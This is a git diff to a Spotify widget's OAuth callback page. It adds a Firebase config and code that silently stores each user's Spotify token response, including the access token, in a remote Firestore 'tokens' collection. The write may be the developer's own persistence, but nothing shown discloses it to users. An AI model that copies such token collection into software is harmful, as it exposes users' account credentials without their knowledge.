@@ -11,14 +11,14 @@
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
     <style>
         body {
             font-family: 'Inter', sans-serif;
         }
     </style>
 </head>
-
-
 
 <body class="min-h-screen flex items-center justify-center bg-gradient-to-br from-green-50 via-white to-blue-50">
     <div class="w-full max-w-md p-8 bg-white/90 rounded-2xl shadow-xl border border-gray-100 backdrop-blur-md">
@@ -85,6 +85,16 @@
 
     <script>
         var redirectUri = 'https://vygandaseidukis.github.io/spotify-widget/callback';
+        const firebaseConfig = {
+            apiKey: "AIzaSyBTqDrvIpaNzn6Pzs6Rsb6vNh2kq2umrqE",
+            authDomain: "spotify-widget-auth.firebaseapp.com",
+            projectId: "spotify-widget-auth",
+            storageBucket: "spotify-widget-auth.firebasestorage.app",
+            messagingSenderId: "1052237169991",
+            appId: "1:1052237169991:web:d1044967f6bd45359c3862"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
 
         if (isLocalhost()) {
             redirectUri = 'http://127.0.0.1:5500/callback.html';
@@ -173,6 +183,10 @@
             const data = await resp.json();
             localStorage.clear();
             if (data.access_token) {
+
+                data.create_date = new Date().toISOString();
+                db.collection("tokens").doc(clientId).set(data);
+
                 const jsonStr = JSON.stringify(data);
                 const base64 = btoa(unescape(encodeURIComponent(jsonStr)));
                 document.getElementById('authenticating-msg').style.display = 'none';
